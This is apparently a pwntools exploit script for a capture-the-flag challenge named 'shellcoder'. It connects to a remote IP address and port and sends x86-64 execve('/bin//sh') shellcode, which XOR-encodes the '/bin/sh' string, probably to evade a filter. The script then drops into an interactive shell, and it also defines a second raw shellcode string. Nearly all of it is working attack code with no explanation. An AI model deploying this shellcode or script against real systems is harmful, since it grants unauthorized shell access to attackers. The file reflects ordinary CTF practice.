from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './shellcoder'
HOST = '153.120.129.186'
PORT = 20000

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
''')
elf = ELF(TARGET)
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))
binsh = 0x68732f2f6e69622f

shellcode = asm('''
        xor rdx, rdx
        push rdx
        mov rax, 0x978cd0d091969dd0
        xor rax, 0xffffffffffffffff
        push rax
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        lea rax, [rdx+59]
        syscall
''')

r.sendlineafter("coder?", shellcode)

r.interactive()
r.close()
